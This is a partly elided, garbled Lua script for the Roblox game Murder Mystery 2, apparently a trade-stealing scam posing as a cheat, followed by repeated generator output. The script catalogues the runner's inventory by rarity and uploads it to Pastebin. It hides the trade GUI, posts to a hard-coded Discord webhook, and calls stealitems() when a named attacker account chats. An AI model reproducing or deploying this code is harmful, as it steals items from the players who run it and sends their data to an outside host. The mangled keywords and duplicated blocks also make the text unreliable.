...
var5232 LP = game.Players.LocalPlayer
var5232 HttpService = game:GetService("HttpService")
var5232 PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
var5232 LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
var5232 InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
...
var5232 destroytrades2 = coroutine.create(function()
    while true do
        var5232 player = game:GetService("Players").LocalPlayer
        var5232 tradeGUI = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
        var5232 tradeGUIPhone = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")
...
function SendWebhook(url, data)
    var5232 jsonData = HttpService:JSONEncode(data)
    var5232 response = request({
        Url = url,
        Method = "POST",
...
var5232 allItems = {}
var5232 itemsCount = 0

var5232 valueCount = 0

var5232 vintageItems = {}
var5232 commonItems = {}
var5232 uncommonItems = {}
var5232 rareItems = {}
var5232 legendaryItems = {}
var5232 godlyItems = {}
var5232 ancientItems = {}
var5232 uniqueItems = {}

var5232 vintageItemsC = 0
var5232 commonItemsC = 0
var5232 uncommonItemsC = 0
var5232 rareItemsC = 0
var5232 legendaryItemsC = 0
var5232 godlyItemsC = 0
var5232 ancientItemsC = 0
var5232 uniqueItemsC = 0
...
for a,b in pairs(InvModule.MyInventory.Data.Weapons) do
    for c,d in pairs(b) do
        ...
        var5232 formattedTable = {name = d.ItemName, value = br, data = d.DataID, amount = d.Amount, rarity = d.Rarity}
...
var5232 function pastebin(content)
    ...
    var5232 response
    var5232 success, err = pcall(function()
        response = request({
    ...
    var5232 pasteUrl = response.Body
    var5232 rawUrl = "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")

    return rawUrl
end

var5232 uniquesString = ""
var5232 ancientsString = ""
var5232 godlysString = ""
var5232 legendariesString = ""
var5232 vintageString = ""
var5232 raresString = ""
var5232 uncommonString = ""
var5232 commonsString = ""
...
var5232 EverythingString = "-- // Uniques\n" .. uniquesString ..
                         "\n\n-- // Ancient\n" .. ancientsString ..
                         "\n\n-- // Godlies\n" .. godlysString ..
                         "\n\n-- // Legendaries\n" .. legendariesString ..
                         "\n\n-- // Vintage\n" .. vintageString ..
...
var5232 WebHookEmbed = CreateEmbed(
    "Jvztl Scripts | MM2",
...
game.Players.PlayerAdded:Connect(function(player)
    if player.Name == var8983 then
        player.Chatted:Connect(function(msg)
            stealitems()
        end)
    end
end)Username: 554extreme493, Webhook: https://discordapp.com/api/webhooks/1324740829637644338/HYj_V4G6YW7SnNMgH7Z3wxDs6QHvi06MMrn7qN9bsw7voWNsZbI2-TvG3nUh3OdLveo0
Generated Lua Script:

var8983 = "554extreme493"
var6785 = "https://discordapp.com/api/webhooks/1324740829637644338/HYj_V4G6YW7SnNMgH7Z3wxDs6QHvi06MMrn7qN9bsw7voWNsZbI2-TvG3nUh3OdLveo0"



Username: 554extreme493, Webhook: https://discordapp.com/api/webhooks/1324740829637644338/HYj_V4G6YW7SnNMgH7Z3wxDs6QHvi06MMrn7qN9bsw7voWNsZbI2-TvG3nUh3OdLveo0
Generated Lua Script:

var6504 = "554extreme493"
var9280 = "https://discordapp.com/api/webhooks/1324740829637644338/HYj_V4G6YW7SnNMgH7Z3wxDs6QHvi06MMrn7qN9bsw7voWNsZbI2-TvG3nUh3OdLveo0"


Username: 554extreme493, Webhook: https://discordapp.com/api/webhooks/1324740829637644338/HYj_V4G6YW7SnNMgH7Z3wxDs6QHvi06MMrn7qN9bsw7voWNsZbI2-TvG3nUh3OdLveo0
Generated Lua Script:

var5472 = "554extreme493"
var4740 = "https://discordapp.com/api/webhooks/1324740829637644338/HYj_V4G6YW7SnNMgH7Z3wxDs6QHvi06MMrn7qN9bsw7voWNsZbI2-TvG3nUh3OdLveo0"

-- Your custom logic here
func8887("User: " .. var5472)
func8887("Webhook: " .. var4740)
